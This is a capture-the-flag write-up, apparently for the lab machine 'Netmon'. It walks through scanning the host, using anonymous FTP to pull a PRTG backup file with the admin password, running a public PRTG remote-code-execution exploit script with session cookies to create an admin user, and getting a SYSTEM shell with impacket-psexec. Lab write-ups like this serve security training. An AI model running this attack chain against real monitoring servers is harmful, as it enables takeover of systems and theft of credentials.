# Netmon
## ftp
## CVE
## impacket-psexec
``````

➜  ~  sudo vi /etc/hosts

10.10.10.152 netmon.htb

➜  ~ rustscan -a netmon.htb --ulimit 5000

PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack
80/tcp    open  http         syn-ack
135/tcp   open  msrpc        syn-ack
139/tcp   open  netbios-ssn  syn-ack
445/tcp   open  microsoft-ds syn-ack
5985/tcp  open  wsman        syn-ack
47001/tcp open  winrm        syn-ack
49664/tcp open  unknown      syn-ack
49665/tcp open  unknown      syn-ack
49666/tcp open  unknown      syn-ack
49667/tcp open  unknown      syn-ack
49668/tcp open  unknown      syn-ack
49669/tcp open  unknown      syn-ack

➜  sudo nmap -sV -T4 -p- -oA netmon -vv netmon.htb

PORT      STATE SERVICE      REASON          VERSION
21/tcp    open  ftp          syn-ack ttl 127 Microsoft ftpd
80/tcp    open  http         syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

ftp netmon.htb

Username: anonymous
Password: 

ftp> cd Users
ftp> cd Public
ftp> dir
ftp> get user.txt
ftp> exit

Go to:

http://netmon.htb

PRTG Network Monitor (NETMON)

GoogleFu:

Default credentials:

prtgadmin:prtgadmin

Does not work. Upon setting forgot password for 'prtgadmin' you can verify the account is active

GoogleFu:

PRTG Network Monitor directory setup:

https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data

Data directory

Windows Server 2012 (R2), Windows Server 2016, Windows 10, Windows 8.1, Windows 8, Windows 7, Windows Server 2008 R2:

%programdata%\Paessler\PRTG Network Monitor

ftp netmon.htb

Username: anonymous
Password: 

ftp> cd ..
ftp> cd ProgramData
ftp> cd Paessler
ftp> cd PRTG\ Network\ Monitor
ftp> dir

229 Entering Extended Passive Mode (|||50451|)
125 Data connection already open; Transfer starting.
12-15-21  08:23AM       <DIR>          Configuration Auto-Backups
06-23-22  04:19PM       <DIR>          Log Database
02-03-19  12:18AM       <DIR>          Logs (Debug)
02-03-19  12:18AM       <DIR>          Logs (Sensors)
02-03-19  12:18AM       <DIR>          Logs (System)
06-23-22  04:19PM       <DIR>          Logs (Web Server)
06-23-22  04:24PM       <DIR>          Monitoring Database
02-25-19  10:54PM              1189697 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-23-22  05:00PM              1671777 PRTG Graph Data Cache.dat
02-25-19  11:00PM       <DIR>          Report PDFs
02-03-19  12:18AM       <DIR>          System Information Database
02-03-19  12:40AM       <DIR>          Ticket Database
02-03-19  12:18AM       <DIR>          ToDo Database
226 Transfer complete.

Go to:

https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data -> Files and subfolders in the data directory

Cross-reference each Folder/File and determine the only one that is out of place is:

PRTG Configuration.old.bak

ftp> get PRTG Configuration.old.bak
ftp> exit
bat PRTG\ Configuration.old.bak 

                   <dbpassword>
 141   │           <!-- User: prtgadmin -->
 142   │           PrTg@dmin2018
 143   │             </dbpassword>

Credentials:

prtgadmin:PrTg@dmin2018

Fail
Try:

prtgadmin:PrTg@dmin2019

GoogleFu:

Paessler 18.1.37.13946 exploit

https://www.exploit-db.com/exploits/46527
https://github.com/A1vinSmith/CVE-2018-9276
https://github.com/chcx/PRTG-Network-Monitor-RCE

cd /opt ; git clone https://github.com/chcx/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh

Ctrl+Shift+i -> Storage
Copy cookies
Change:

./prtg-exploit.sh -u http://10.10.10.10 -c "_ga=GA1.4.XXXXXXX.XXXXXXXX; _gid=GA1.4.XXXXXXXXXX.XXXXXXXXXXXX; OCTOPUS1813713946=XXXXXXXXXXXXXXXXXXXXXXXXXXXXX; _gat=1" 

To

./prtg-exploit.sh -u http://netmon.htb -c "_ga=GA1.2.1831765926.1656016309; _gid=GA1.2.896213690.1656016309; OCTOPUS1813713946=e0VFMzA4MDhBLTIzN0EtNDQwMy05QzE3LTg5QTQxOEU1Njg3RX0%3D; _gat=1" 

chmod 700 prtg-exploit.sh

./prtg-exploit.sh -u http://netmon.htb -c "_ga=GA1.2.1831765926.1656016309; _gid=GA1.2.896213690.1656016309; OCTOPUS1813713946=e0VFMzA4MDhBLTIzN0EtNDQwMy05QzE3LTg5QTQxOEU1Njg3RX0%3D; _gat=1" 

Response:

 [*] exploit completed new user 'pentest' with password 'P3nT3st!' created have fun! 


➜  ~ which impacket-psexec

/usr/bin/impacket-psexec

➜  ~ impacket-psexec pentest:'P3nT3st!'@netmon.htb

C:\Windows\system32> whoami

nt authority\system

C:\> dir C:\Users /s /b | findstr /e .txt
l Users\VMware\VMware Tools\Unity Filters\microsoftoffice.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\vistasidebar.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\visualstudio2005.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\vmwarefilters.txt
C:\Users\All Users\VMware\VMware Tools\Unity Filters\win7gadgets.txt
C:\Users\Public\tester.txt
C:\Users\Public\user.txt
C:\Users\Public\Desktop\user.txt

C:\> type C:\Users\Public\user.txt

user_flag

C:\> type C:\Users\Administrator\Desktop\root.txt

root_flag

``````

![image](https://0xc0rvu5.github.io/docs/assets/images/20220623155702.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220623164356.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220623164111.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220623165954.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220623170144.png)

![image](https://0xc0rvu5.github.io/docs/assets/images/20220625004615.png)

#hacking
